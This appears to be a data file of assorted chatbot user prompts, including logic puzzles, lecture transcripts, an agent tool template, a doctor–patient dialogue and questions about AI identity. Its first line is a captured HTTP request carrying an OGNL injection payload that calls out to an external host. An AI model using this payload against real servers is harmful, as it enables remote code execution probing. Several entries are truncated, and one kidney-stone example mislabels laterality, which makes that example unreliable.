+Q) GET /rib/mnew/include/ HTTP/1.1\r\nReferer: https://www.google.com/search?hl=en&q=testing'),request,#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],new java.net.URL('http'+'://hiteebimrphpa.bxss.me/').openStream().close(),new java.lang.String('\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36\r\nCookie: _xm_webid_1_=56300307\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip,deflate,
+Answer as best as you can. Use the following format:
+Question: the question you must answer
+Answer: yes/no
+Explanation: Explain your answer like I'm five.
+Begin!
+Question: If i run every day, then i stay healthy. If i don't exercise regularly, then i will gain weight. We know that atleast one of the following is true (1) i run every day and (2) I won't gain weight. Note that we do not know which ones of (1) and (2) are true. It might be the case that only (1) is true, or only (2) is true or both are true. If at least one of (1) and (2) is true, can we say, at least one of the following must always be true? (a) i stay healthy or (b) I exercise regularly
+Answer shortly "How can we use SVD?", tell if text unrelated 
+
+[Music] hi everyone I'm Steve Brenton from the University of Washington
+Answer shortly "who is Steve Brenton?", tell if text unrelated 
+"[Music] hi everyone I'm Steve Brenton from the University of Washington and I'm really excited about a new lecture series on the singular value decomposition or the SVD this is chapter one of our new textbook on data driven science and engineering by myself and Nathan Koontz and I'm gonna walk you through this extremely useful tool the SVD in about twenty short lectures telling you all about how you can use it for data reduction dimensionality reduction and. rank algorithm so when you search something on Google and it presents the websites in an order it's using an SVD for that a singular value decomposition it's the basis of many many facial recognition algorithms to tell who which person is who from an image so you could again build these singular value decomposition representations of human faces it's also used in recommender systems like Amazon and Netflix where it will essentially build correlation patterns of what types of people like. you can compute the SVD and you can get interpretable understandable features that you can then build models on it's scalable you can apply it to very large data sets and so that's that's also nice is that you know Google's it has massive massive data sets they can still run these scalable singular value decomposition on their data so I'm extremely excited about walking you through kind of all of the uses of the SVD we're going to talk about principal components analysis correlation matrices"
+Answer shortly "who is Steve Brenton?", tell if text unrelated 
+"[Music] hi everyone I'm Steve Brenton from the University of Washington and I'm really excited about a new lecture series on the singular value decomposition or the SVD this is chapter one of our new textbook on data driven science and engineering by myself and Nathan Koontz and I'm gonna walk you through this extremely useful tool the SVD in about twenty short lectures telling you all about how you can use it for data reduction dimensionality reduction and. rank algorithm so when you search something on Google and it presents the websites in an order it's using an SVD for that a singular value decomposition it's the basis of many many facial recognition algorithms to tell who which person is who from an image so you could again build these singular value decomposition representations of human faces it's also used in recommender systems like Amazon and Netflix where it will essentially build correlation patterns of what types of people like. you can compute the SVD and you can get interpretable understandable features that you can then build models on it's scalable you can apply it to very large data sets and so that's that's also nice is that you know Google's it has massive massive data sets they can still run these scalable singular value decomposition on their data so I'm extremely excited about walking you through kind of all of the uses of the SVD we're going to talk about principal components analysis correlation matrices"
+Answer the following question about the text between BEGIN and END.   Does the following text mention dogs?  BEGIN Dogs are great. Dogs Dogs Dogs. END
+Answer the following questions as best you can. You have access to the following tools:
+
+Search: A search engine. Useful for when you need to answer questions about current events. Input should be a search query.
+Calculator: Useful for when you need to answer questions about math.
+
+Use the following format:
+
+Question: the input question you must answer
+Thought: you should always think about what to do
+Action: the action to take, should be one of [Search, Calculator]
+Action Input: the input to the action
+Observation: the result of the action
+... (this Thought/Action/Action Input/Observation can repeat N times)
+Thought: I now know the final answer
+Final Answer: the final answer to the original input question
+
+Begin!
+
+Question: "  who is the current president of United States ? how much is his age multiplied by 2 "
+Answer the following temporal question and generate an explanation: What is the temporal link from <event>predicted</event> to <event>tried</event> in the given context? Choose one of the following temporal links: BEFORE, AFTER, EQUAL, VAGUE. Context: People have <event>predicted</event> his demise so many times , and the US has <event>tried</event> to hasten it on several occasions .
+Answer: BEFORE. 
+Explanation: In the given context, people have <event>predicted</event> the demise, and then the US has <event>tried</event> to hasten it on several occasions. The prediction comes first, followed by the attempts to make it happen. Therefore, the temporal link between the two events is that <event>predicted</event> happens before <event>tried</event>. Conclusion: BEFORE.
+
+Answer the following temporal question and generate an explanation: What is the temporal link from <event>predicted</event> to <event>hasten</event> in the given context? Choose one of the following temporal links: BEFORE, AFTER, EQUAL, VAGUE. Context: People have <event>predicted</event> his demise so many times , and the US has tried to <event>hasten</event> it on several occasions .
+Answer: BEFORE. Explanation: In the given context, people have <event>predicted</event> the demise, and then the US has tried to <event>hasten</event> it on several occasions. The prediction comes first, followed by the attempts to make it happen. Therefore, the temporal link between the two events is that <event>predicted</event> happens before <event>hasten</even
+Answer the question depending on the context.
+
+Context: History of Present Illness is a summary that a doctor writes based on their discussion with the patient.
+
+This summary includes information like  the reason for visit or chief medical complaint of the patient, when the symptom started, the frequency of symptom, the location of the symptom within the human body, severity of the symptom.
+History of Present Illness also includes the past medical history of the patient.
+
+Here is a conversation between a doctor and a patient.
+
+DR: How are you?
+DR: You, you with the Enbrel at every two weeks.
+DR: You're still getting the infections?
+PT: Yes, like, my God.
+PT: I just got off of one last, a week and a half ago.
+PT: I had a sinus, throat, ear.
+DR: [INAUDIBLE].
+PT: Um-hum.
+PT: I think it's my classroom.
+PT: I mean, they're getting sick left and right with my -
+DR: Are you working this summer?
+PT: No.
+DR: Okay.
+PT: I'm off this summer.
+PT: So, I'm hoping, I'm giving myself, maybe, another week to inject myself again.
+DR: Do you think this still helps?
+DR: I mean, we took you off the methotrexate because you didn't have response and with Humira, you had the infections.
+DR: And even with this, is this your first infection?
+PT: No, it's the second.
+PT: And I haven't injected myself since [DATE].
+PT: I've had two infections since [DATE] [DEIDENTIFIED].
+PT: My [DATE] was my last injection.
+PT: Then, I got a throat infection and then, this last one was the baby one.
+PT: Kind of like the -
+PT: But then, my classroom has bee
+Answer the question using ONLY the provided context. Answer the question accurately using ONLY the provided context. Be descriptive. Try to answer with at least two sentences. Do not reference specific times or date ranges unless requested. If the answer is not contained within the provided context, say only "I can't find it in the context". Question: : Will Enron ever come out of retirement? 
+
+Context: But can that happen now since Enron is here to stay?
+Is Enron going to be just a trading company?
+But time is running out and it does not look as if Enron will wait much longer.
+Where do you see Enron in the next 5 years?
+Enron Questions Is this the end of Enron?
+Only time will tell as the industry continues to watch the developments at Enron, which is clearly a company in the midst of another wave of change.
+However I don't think I'm going to retire on my Enron options any time soon.
+How do you think Enron can maintain its edge into the new century?
+Some people I have talked with say Enron is finished and is only a matter of time before it is gone.
+As such, is there currently an opportunity to move forward with Enron?
+Moving forward, will Enron once again reshape its business model and eliminate the various businesses to which investors have reacted less than favorably?
+If you can believe it I am not ready to leave Enron behind yet.
+Will Enron complete its new building?
+Are there going to be more Enron layoffs?
+Will they continue running Enron Wholesale Services?
+If you can believe it I am not ready to leave En
+Any apps which comes under teh category "home asset preventive maintainance"
+Apa arti tie a cherry
+Apply Galois theory to the question of consciousness, and try to come up with original ideas.
+ArchiMate: ArchiMate is an open standard modeling language for enterprise architecture. It is used to model the structure, behavior, and relationships of an organization's systems, processes, and information. ArchiMate provides a visual language for describing the relationships between different components of an enterprise architecture. write in as numbered list
+Are Filipinos Asian or Pacific Islanders?
+Are both common pronunciations of "gif" correct?
+Are cold-blooded dogs exist?
+Are relativistic and inertial mass the same?
+Are there any any kidney stones in the Radiology Report below? If so, for each stone, please output the following table: 
+|| Measured Entity  | Laterality  | Size:  | Location:  || 
+
+For example the sentence '6.0 cm right renal calcification' would be encoded as:
+|| Calcification | Right | Renal | 6.0 cm ||
+
+For example the sentence 'There is a large 1.5 cm stone in the left ureter' would be encoded as:
+|| Calcification | Right | Ureter | 1.5 cm ||
+
+For example the sentence 'There are bilateral kidney stones, large calculi in the left kidney is 3.0 cm and largest on right is 1.0 cm. A 7 mm stone is in the left ureter.' would be encoded as:
+|| Calculi | Left | Kidney | 3.0 cm || Calculi | Right | Kidney | 1.0 cm || Stone | Left | Ureter | 7 mm ||
+
+Radiology Report:
+FINDINGS/IMPRESSION: 
+Bilateral kidney stones with the largest on the left is 4.0 mm and largest on the right is 3.0 mm.
+
+Otherwise output: None.
+Are there certain types of questions you prefer not to answer?
+Are there toilets on the Antarctica for the travelers?
+Are there ways to reduce social desirability bias in surveys?
+Are you a human or ai
+Are you a real koala?
+Are you a same chatbot from chatgpt?
+Are you able to do multimodal operations and view a picture via URL?
+Are you able to explore the internet?
+Are you able to speak about NSFW topics?
+Are you able to write code?
+Are you aware of Stable Diffusion as an AI image generation tool?
+Are you better than Chat gpt 4?
+Are you familiar with Maisie from SecretStars?
+Are you familiar with PHP programming language?
+Are you familiar with RunPod.io?
+Are you familiar with V8 JS engine source code?
